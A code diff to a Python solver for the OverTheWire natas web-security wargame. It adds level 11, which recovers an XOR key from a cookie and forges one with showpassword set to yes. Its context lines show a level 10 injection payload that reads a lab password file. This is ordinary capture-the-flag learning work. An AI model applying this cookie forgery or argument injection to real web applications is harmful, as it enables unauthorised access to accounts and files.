@@ -4,7 +4,25 @@ import requests
 import re
 import binascii
 import base64
+import urllib
 import time
+
+def xor_encrypt(text, key) :
+	outText = ''
+	for i, c in enumerate(text):
+		outText += chr(ord(c) ^ ord(key[i % len(key)]))
+	return outText
+
+def findReapet(text) :
+	textLen = len(text)
+	for i in range(2, textLen) :
+		for j, c in enumerate(text) :
+			if (j < i) :
+				continue
+			if (text[j % i] != text[j]) :
+				break
+			if (j == textLen - 1) :
+				return text[:i]
 
 def getPassword(auth, level) :
 	url = 'http://natas' + str(level) + '.natas.labs.overthewire.org/'
@@ -59,6 +77,16 @@ def getPassword(auth, level) :
 		url = url + 'index.php?needle=. /etc/natas_webpass/natas11 #&submit=Search'
 		pattern = r'/etc/natas_webpass/natas11:(\w+)'
 	
+	elif level == 11 :
+		r = requests.get(url, auth=auth)
+		dataP = r'data=(\S+)'
+		result = re.search(dataP, str(r.headers['set-cookie']))
+		xorKey = '{"showpassword":"no","bgcolor":"#ffffff"}'
+		key = findReapet(xor_encrypt(base64.b64decode(urllib.unquote(result.group(1))), xorKey))
+		payload = '{"showpassword":"yes","bgcolor":"#ffffff"}'
+		cookieData = base64.b64encode((xor_encrypt(payload, key)))
+		headers = {'Cookie':'data=' + cookieData}
+
 	else :
 		return str(level + 1) + ' not work'
 	
